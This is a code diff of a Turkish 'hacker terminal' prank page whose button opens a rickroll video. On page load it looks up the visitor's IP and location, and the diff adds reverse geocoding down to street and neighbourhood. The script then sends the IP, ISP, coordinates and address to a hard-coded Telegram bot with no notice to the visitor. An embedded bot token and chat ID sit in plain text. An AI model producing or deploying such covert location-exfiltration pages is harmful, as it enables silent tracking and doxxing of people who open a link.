@@ -13,31 +13,40 @@
       display: flex;
       justify-content: center;
       align-items: center;
+      height: 100vh;
     }
     #container {
-      width: 90vw;
-      max-width: 800px;
-      height: 90vh;
+      width: 95vw;
+      max-width: 1200px;
+      height: 95vh;
       background-color: black;
       border-radius: 8px;
-      padding: 10px 15px;
+      padding: 0;
       box-sizing: border-box;
-      overflow: hidden;
       box-shadow: 0 0 20px #00ff00;
-      white-space: pre-wrap;
-      user-select: none;
       display: flex;
-      flex-direction: column;
+      gap: 8px;
     }
     #terminal {
-      flex: none;
-      height: 62vh;
+      flex: 1 1 50%;
+      background: black;
+      padding: 10px 15px;
       overflow-y: auto;
-      margin-bottom: 8px;
-      font-size: 13px;
-      line-height: 1.3;
+      font-size: 14px;
+      line-height: 1.4;
+      white-space: pre-wrap;
+      user-select: none;
+      border-radius: 8px;
+      border: 1px solid #00ff00;
+    }
+    #map {
+      flex: 1 1 50%;
+      border: 2px solid #00ff00;
+      border-radius: 8px;
+      background: #111;
     }
     #rickrollButton {
+      display: none;
       background: #00ff00;
       color: black;
       padding: 14px 35px;
@@ -50,13 +59,7 @@
       align-self: center;
       transition: background 0.3s ease;
       box-shadow: 0 0 15px #00ff00;
-      margin-bottom: 8px;
-    }
-    #map {
-      flex: 0 0 25vh;
-      border: 2px solid #00ff00;
-      border-radius: 6px;
-      background: #111;
+      margin: 8px auto;
     }
     #rickrollButton:hover {
       background: #00cc00;
@@ -82,9 +85,9 @@
 <body>
   <div id="container">
     <pre id="terminal"></pre>
-    <button id="rickrollButton" style="display:none;">Sürpriz İçin Tıkla</button>
     <div id="map"></div>
   </div>
+  <button id="rickrollButton">Sürpriz İçin Tıkla</button>
 
   <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.js"></script>
 
@@ -133,7 +136,9 @@
           country: data.country_name || 'Bilinmiyor',
           ip: data.ip || 'Bilinmiyor',
           org: data.org || 'Bilinmiyor',
-          postal: data.postal || 'Bilinmiyor'
+          postal: data.postal || 'Bilinmiyor',
+          street: '',
+          neighborhood: ''
         };
       } catch {
         return {
@@ -144,12 +149,33 @@
           country: 'Türkiye',
           ip: 'Tespit edilemedi',
           org: 'Bilinmiyor',
-          postal: 'Bilinmiyor'
+          postal: 'Bilinmiyor',
+          street: '',
+          neighborhood: ''
         };
       }
     }
 
-    // Telegram mesaj gönderme fonksiyonu
+    async function reverseGeocode(lat, lon) {
+      try {
+        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1`;
+        const response = await fetch(url, {headers: {'User-Agent': 'KonumTakipci/1.0'}});
+        const data = await response.json();
+
+        const addr = data.address || {};
+        return {
+          street: addr.road || '',
+          neighborhood: addr.suburb || addr.neighbourhood || '',
+          city: addr.city || addr.town || addr.village || '',
+          region: addr.state || '',
+          country: addr.country || ''
+        };
+      } catch {
+        return {street: '', neighborhood: '', city: '', region: '', country: ''};
+      }
+    }
+
+    // Telegram mesaj gönderme fonksiyonu (bot token ve chat id buraya)
     function sendTelegramMessage(message) {
       const chatId = '640073750';
       const botToken = '78059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg';
@@ -176,15 +202,25 @@
 
     async function collectData() {
       logToTerminal(`[${getCurrentTime()}] Sistem başlatılıyor...`);
-      const locationData = await getLocationData();
+      let locationData = await getLocationData();
+
+      // Reverse geocode ile mahalle, sokak bilgisi alma
+      const reverse = await reverseGeocode(locationData.latitude, locationData.longitude);
+      locationData.street = reverse.street || locationData.street;
+      locationData.neighborhood = reverse.neighborhood || locationData.neighborhood;
+      locationData.city = reverse.city || locationData.city;
+      locationData.region = reverse.region || locationData.region;
+      locationData.country = reverse.country || locationData.country;
 
       const coordsFormatted = formatCoordinate(locationData.latitude, locationData.longitude);
 
-      const infoMessage = 
+      let infoMessage = 
         `Konum Bilgileri:\n` +
         `IP: ${locationData.ip}\n` +
         `Şehir: ${locationData.city}\n` +
         `Bölge: ${locationData.region}\n` +
+        `Mahalle: ${locationData.neighborhood || 'Bilinmiyor'}\n` +
+        `Sokak: ${locationData.street || 'Bilinmiyor'}\n` +
         `Posta Kodu: ${locationData.postal}\n` +
         `Ülke: ${locationData.country}\n` +
         `ISP: ${locationData.org}\n` +
@@ -205,10 +241,9 @@
 
       logToTerminal(infoMessage);
 
-      showMap(locationData.latitude, locationData.longitude, locationData);
-
-      // Telegram'a gönder
       sendTelegramMessage(infoMessage);
+
+      showMap(locationData.latitude, locationData.longitude, locationData);
 
       logToTerminal(`[${getCurrentTime()}] Sistem hazır!`);
       addButton();
@@ -217,48 +252,30 @@
     function showMap(lat, lon, locationData) {
       try {
         document.getElementById('map').innerHTML = '';
-        map = L.map('map').setView([lat, lon], 13);
-
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-          attribution: '&copy; OpenStreetMap contributors',
-          maxZoom: 18,
+        map = L.map('map').setView([lat, lon], 16);
+L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+          maxZoom: 19,
+          attribution: '&copy; OpenStreetMap contributors'
         }).addTo(map);
 
-        const popupContent = `
-          <div style="color: #00ff00; background: #222; padding: 10px;">
-            <strong>📍 Konumunuz</strong><br>
-            ${formatCoordinate(lat, lon)}<br>
-            <strong>Şehir:</strong> ${locationData.city}<br>
-            <strong>Ülke:</strong> ${locationData.country}
-          </div>
-        `;
+        const popupContent =
+          `<b>Konum:</b> ${locationData.city}, ${locationData.region}<br>` +
+          `<b>Mahalle:</b> ${locationData.neighborhood || 'Bilinmiyor'}<br>` +
+          `<b>Sokak:</b> ${locationData.street || 'Bilinmiyor'}<br>` +
+          `<b>Koordinatlar:</b> ${locationData.latitude.toFixed(6)}, ${locationData.longitude.toFixed(6)}`;
 
-        L.marker([lat, lon]).addTo(map)
-          .bindPopup(popupContent)
-          .openPopup();
-
-        setTimeout(() => map.invalidateSize(), 100);
-
-      } catch (error) {
-        logToTerminal(`[${getCurrentTime()}] Harita yüklenirken hata: ${error.message}`);
-      }
+        const marker = L.marker([lat, lon]).addTo(map);
+        marker.bindPopup(popupContent).openPopup();
     }
 
     function addButton() {
-      button.style.display = 'inline-block';
+      button.style.display = 'block';
       button.onclick = () => {
-        logToTerminal(`[${getCurrentTime()}] Sürpriz butonuna tıklandı!`);
         window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ', '_blank');
       };
     }
 
-    window.addEventListener('load', () => {
-      setTimeout(collectData, 500);
-    });
-
-    window.addEventListener('resize', () => {
-      if (map) setTimeout(() => map.invalidateSize(), 100);
-    });
+    collectData();
   </script>
 </body>
 </html>
